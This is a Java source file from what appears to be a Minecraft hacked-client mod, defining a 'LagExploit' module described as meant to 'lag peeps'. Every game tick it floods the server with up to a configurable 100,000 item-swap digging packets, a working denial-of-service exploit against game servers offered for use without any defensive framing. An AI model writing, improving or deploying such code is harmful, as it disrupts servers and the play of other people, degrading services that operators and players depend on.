package meow.konc.hack.modules.exploits;

import meow.konc.hack.module.Module;
import meow.konc.hack.setting.Setting;
import meow.konc.hack.setting.Settings;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;

@Module.Info(name = "LagExploit", category = Module.Category.EXPLOITS, description = "lag peeps")
public class LagExploit<Timer> extends Module
{
    private Setting<Integer> speed = (Setting<Integer>)register(Settings.integerBuilder("Speed").withRange(0, 100000).withValue(2000).build());
    private Timer timer;
    
    @Override
    public void onUpdate() {
        if (!isEnabled()) {
            return;
        }
        try {
            for (int i = 1; i <= speed.getValue(); ++i) {
                mc.getConnection().sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.DOWN));
            }
        }
        catch (Exception e) {
            e.printStackTrace();
            setEnabled(false);
            mc.player.sendChatMessage("Disabled offhand lag due to error: " + e.toString());
        }
    }
}
